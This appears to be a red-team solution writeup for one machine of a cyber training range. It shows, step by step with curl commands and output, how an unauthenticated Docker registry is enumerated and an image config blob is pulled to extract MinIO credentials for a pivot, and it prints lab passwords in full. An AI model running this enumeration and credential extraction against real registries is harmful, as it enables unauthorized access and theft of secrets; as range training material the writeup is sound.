# solve_red.md — M2 · dev-registry
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M2 — PUL Container Registry
**Vulnerability:** Unauthenticated Docker Registry v2 API + Credentials in Image Config ENV Blob
**MITRE:** T1552.001 (Credentials in Files) · T1613 (Container and Resource Discovery)
**Severity:** Hard | **Operator:** Rudra-7

---
## Objective
Using Docker registry credentials extracted from M1 (pul-registry-svc:Rg5try@PUL!Bld24), enumerate the PUL Container Registry v2 API without authentication (registry accepts auth but doesn't require it for read). Pull the firmware-builder image manifest and config blob. Extract MinIO artifact store credentials from the image ENV layer.

---
## Step-by-Step

### Step 1 — Discover Registry
```bash
curl -s http://11.x.x.x:5000/v2/
# Returns: {} with Docker-Distribution-Api-Version: registry/2.0 header
```

<img width="761" height="431" alt="image" src="https://github.com/user-attachments/assets/acdd2df3-860d-49b1-9142-de2028b62de6" />



### Step 2 — Enumerate Repositories (unauthenticated)
```bash
curl -s http://11.x.x.x:5000/v2/_catalog
# {"repositories":["pul/firmware-builder","pul/sonar-runner"]}
```

<img width="843" height="224" alt="image" src="https://github.com/user-attachments/assets/0921b911-87cc-4024-8447-0c59dd8f02b6" />



### Step 3 — Get Tags
```bash
curl -s http://11.x.x.x:5000/v2/pul/firmware-builder/tags/list
# {"name":"pul/firmware-builder","tags":["latest","v3.2.1","v3.1.0","v3.0.5"]}
```

<img width="1086" height="300" alt="image" src="https://github.com/user-attachments/assets/eefc5ef4-d48b-4d1d-88fc-012375f1607f" />



### Step 4 — Get Manifest (extract config digest)
```bash
curl -s http://11.x.x.x:5000/v2/pul/firmware-builder/manifests/latest | python3 -m json.tool
```
Note the config digest: `sha256:a4f3c2b1e8d7...`

<img width="1297" height="548" alt="image" src="https://github.com/user-attachments/assets/5bd18a47-d48a-4060-aefd-29df2cf1e8c0" />



### Step 5 — Download Config Blob (contains ENV with credentials)
```bash
DIGEST="sha256:a4f3c2b1e8d7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1"
curl -s "http://11.x.x.x:5000/v2/pul/firmware-builder/blobs/${DIGEST}" | python3 -m json.tool
```

<img width="1468" height="1017" alt="image" src="https://github.com/user-attachments/assets/9f6e8f4d-1354-49a7-8240-f98fa70135d3" />


ENV layer reveals:
```
"ARTIFACT_STORE_HOST=11.x.x.x"
"ARTIFACT_STORE_PORT=9000"
"MINIO_ACCESS_KEY=pul-build-svc"
"MINIO_SECRET_KEY=Artf@ct5tr!PUL24"
```

**Pivot:** `pul-build-svc : Artf@ct5tr!PUL24` → M3 Artifact Store (`11.x.x.x:9000`)

---
## MITRE Mapping
| Tactic | Technique | ID |
|---|---|---|
| Discovery | Container and Resource Discovery | T1613 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
